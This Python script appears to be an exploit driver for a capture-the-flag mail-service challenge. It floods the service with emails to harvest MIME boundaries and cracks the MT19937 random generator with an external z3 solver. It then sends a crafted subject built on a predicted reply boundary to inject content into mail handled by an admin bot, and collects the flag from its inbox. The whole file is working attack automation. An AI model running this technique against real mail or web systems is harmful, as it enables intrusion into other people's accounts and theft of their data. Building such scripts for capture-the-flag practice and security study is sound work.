"""Full 496 exploit driver.

Usage:  python _z_496_go.py <BASE_URL> [warmup_n]

Steps: login -> warm up MT19937 with N unsigned sends -> crack (z3 in WSL) ->
probe-check alignment -> send exploit mail with predicted reply boundary ->
2 x admin_bot -> harvest flag from our inbox.
"""
import sys, os, json, re, time, subprocess, http.client
from urllib.parse import urlparse

sys.path.insert(0, r'.')
from _z_496_spec import make_D, make_subj, PWN

BASE = sys.argv[1].rstrip('/')
WARM = int(sys.argv[2]) if len(sys.argv) > 2 else 700
BOUNDS = r'./_z_496_bounds.json'
PRED = r'./_z_496_pred.json'

u = urlparse(BASE)
HOST, PORT = u.hostname, u.port or 80
conn = http.client.HTTPConnection(HOST, PORT, timeout=60)


def req(method, path, obj=None, token=None):
    global conn
    last = None
    for attempt in range(4):
        try:
            body = json.dumps(obj) if obj is not None else None
            hdrs = {}
            if body is not None:
                hdrs['Content-Type'] = 'application/json'
            if token:
                hdrs['token'] = token
            conn.request(method, path, body=body, headers=hdrs)
            r = conn.getresponse()
            data = r.read().decode()
            if r.status >= 400:
                raise RuntimeError('%s %s -> %s %s' % (method, path, r.status, data[:200]))
            return json.loads(data)
        except (http.client.HTTPException, ConnectionError, OSError) as e:
            last = e
            try:
                conn.close()
            except Exception:
                pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=60)
            time.sleep(0.2)
    raise last


# ---------------- 1. credentials ----------------
try:
    cfg = json.load(open(r'./_z_496_remote.json'))
except Exception:
    cfg = {}
if cfg.get('base') == BASE and cfg.get('tok'):
    pw, tok = cfg['pw'], cfg['tok']
    print('[i] reusing token for', BASE)
else:
    pw = req('GET', '/api/password')
    tok = req('POST', '/api/login', {'username': 'user@ses', 'password': pw})
    json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'./_z_496_remote.json', 'w'))
print('[i] pw =', pw, ' tok =', tok[:12])
me = req('GET', '/api/me', None, tok)
print('[i] logged in as', me)

# ---------------- 2. warm up the MT19937 ----------------


def boundary_of(eid):
    em = req('GET', '/api/email/' + eid, None, tok)
    m = re.search(r'boundary="=+(\d+)=+"', em['data'])
    return int(m.group(1)) if m else None


ids = []
t0 = time.time()
for i in range(WARM):
    ids.append(req('POST', '/api/send', {'to': 'user@ses', 'subject': 'q%d' % i, 'body': 'b'}, tok))
print('[i] warmup sent %d in %.1fs' % (len(ids), time.time() - t0), flush=True)

emails = req('GET', '/api/emails', None, tok)
rows = []
for eid in ids:
    e = emails.get(eid)
    if not e:
        continue
    m = re.search(r'boundary="=+(\d+)=+"', e['data'])
    if m:
        rows.append((e['time'], int(m.group(1))))
rows.sort()
print('[i] rows %d  dup-times %d' % (len(rows), len(rows) - len(set(t for t, _ in rows))))
bounds = [b for _, b in rows]
json.dump(bounds, open(BOUNDS, 'w'))
print('[i] sample', bounds[:2], bounds[-2:], flush=True)

# ---------------- 3. crack in WSL ----------------
t0 = time.time()
r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', './_z_496_crack2.py'],
                   capture_output=True, text=True)
print('[i] crack rc=%d %.1fs' % (r.returncode, time.time() - t0))
print(r.stdout[-800:])
if r.returncode != 0:
    print(r.stderr[-1500:])
    sys.exit('crack failed')
preds = json.load(open(PRED))

# ---------------- 4. probe: verify prediction alignment ----------------
pid = req('POST', '/api/send', {'to': 'user@ses', 'subject': 'probe', 'body': 'b'}, tok)
got = boundary_of(pid)
print('[i] probe boundary', got, 'expected', preds[0], 'OK' if got == preds[0] else 'MISMATCH')
if got != preds[0]:
    sys.exit('prediction misaligned, aborting before burning the instance')

B1 = '=' * 15 + ('%019d' % preds[2]) + '=='
print('[i] predicted reply inner boundary B1 =', B1)

# ---------------- 5. exploit mail ----------------
subj = make_subj(B1)
print('[i] subject length', len(subj))
eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': subj, 'body': 'hello'}, tok)
print('[i] exploit email id', eid, '(consumed preds[1] =', preds[1], ')')
json.dump({'base': BASE, 'tok': tok, 'B1': B1, 'eid': eid, 'preds': preds},
          open(r'./_z_496_state.json', 'w'))

# ---------------- 6. two bot runs ----------------
t0 = time.time()
print('[i] bot run 1 ->', req('POST', '/api/admin_bot', None, tok), '%.1fs' % (time.time() - t0), flush=True)
time.sleep(1)
t0 = time.time()
print('[i] bot run 2 ->', req('POST', '/api/admin_bot', None, tok), '%.1fs' % (time.time() - t0), flush=True)

# ---------------- 7. harvest ----------------
for attempt in range(8):
    emails = req('GET', '/api/emails', None, tok)
    for k, e in emails.items():
        d = e['data']
        if 'pwned' in d or re.search(r'[A-Za-z0-9_]*\{[^}]{6,}\}', d):
            print('=== CANDIDATE', k, '===')
            print(d[:4000])
            sys.exit(0)
    print('[i] harvest retry', attempt, 'inbox', len(emails), flush=True)
    time.sleep(3)
print('[-] no flag yet')
